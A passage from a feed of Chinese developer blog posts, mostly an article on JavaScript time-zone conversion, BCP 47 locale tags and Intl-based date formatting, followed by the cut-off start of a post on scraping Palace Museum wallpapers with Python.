<code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\r\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\r\n    return new Date(date.toLocaleString('en-US', { timeZone }))\r\n}\r\n\r\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\r\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\r\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\r\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\r\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\r\n        year: 'numeric',\r\n        month: '2-digit',\r\n        day: '2-digit',\r\n        hour: '2-digit',\r\n        minute: '2-digit',\r\n        second: '2-digit',\r\n        hour12: false,\r\n        timeZone\r\n    })\r\n    return {\r\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\r\n        convert (date) {\r\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\r\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\r\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\r\n        }\r\n    }\r\n}\r\n\r\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\r\n\r\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\r\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\r\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\r\n    return converter.convert(new Date(secDate), tzName) - secDate\r\n}\r\n\r\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\r\ncmn-Hans-SG = 中文普通话-简体-新加坡\r\ncmn-Hant-TW = 中文普通话-繁体-台湾\r\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\r\ncmn = 中文普通话\r\n\r\nzh-Hans = 中文-简体\r\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\r\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\r\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\r\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\r\n}\r\n\r\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\r\n    year: 'numeric',\r\n    month: 'short',\r\n    day: 'numeric',\r\n    weekday: 'long'\r\n}\r\nconst now = new Date()\r\n\r\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\r\n\r\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\r\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\r\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\r\n\r\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\r\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\r\n\r\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\r\n\r\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\r\n\r\nzhCNFormatter.format(now) // 2021年10月13日星期三\r\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\r\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\r\n\r\njaFormatter.format(now) // 2021年10月13日水曜日\r\njaAltFormatter.format(now) // 令和3年10月13日水曜日\r\n\r\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 <code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\r\n// {locale: 'zh-CN', calendar: 'gregory', …}\r\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\r\n     // 基于一个固定日期计算，这里选择 1970.1.1\r\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\r\n    const base = new Date(1970, 0, 1).getTime()\r\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\r\n    return Array.from({ length: 7 }, (_, day) =&gt; (\r\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\r\n    ))\r\n}\r\n\r\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\r\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\r\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\r\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\r\n    year: 'numeric',\r\n    month: 'short',\r\n    day: 'numeric',\r\n    weekday: 'long',\r\n    hour: 'numeric',\r\n    minute: 'numeric',\r\n    second: 'numeric',\r\n}).formatToParts(new Date())\r\n// [\r\n//     { type: 'year', value: '2021' },\r\n//     { type: 'literal', value: '年' },\r\n//     { type: 'month', value: '10' },\r\n//     { type: 'literal', value: '月' },\r\n//     { type: 'day', value: '13' },\r\n//     { type: 'literal', value: '日' },\r\n//     { type: 'weekday', value: '星期三' },\r\n//     { type: 'literal', value: ' ' },\r\n//     { type: 'dayPeriod', value: '上午' },\r\n//     { type: 'hour', value: '1' },\r\n//     { type: 'literal', value: ':' },\r\n//     { type: 'minute', value: '00' },\r\n//     { type: 'literal', value: ':' },\r\n//     { type: 'second', value: '00' }\r\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\r\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\r\n}\r\n\r\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\r\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\r\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\r\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\r\n  timeZone: 'America/Los_Angeles',\r\n  year: 1995,\r\n  month: 12,\r\n  day: 7,\r\n  hour: 3,\r\n  minute: 24,\r\n  second: 30,\r\n  millisecond: 0,\r\n  microsecond: 3,\r\n  nanosecond: 500,\r\n  calendar: 'iso8601'\r\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span 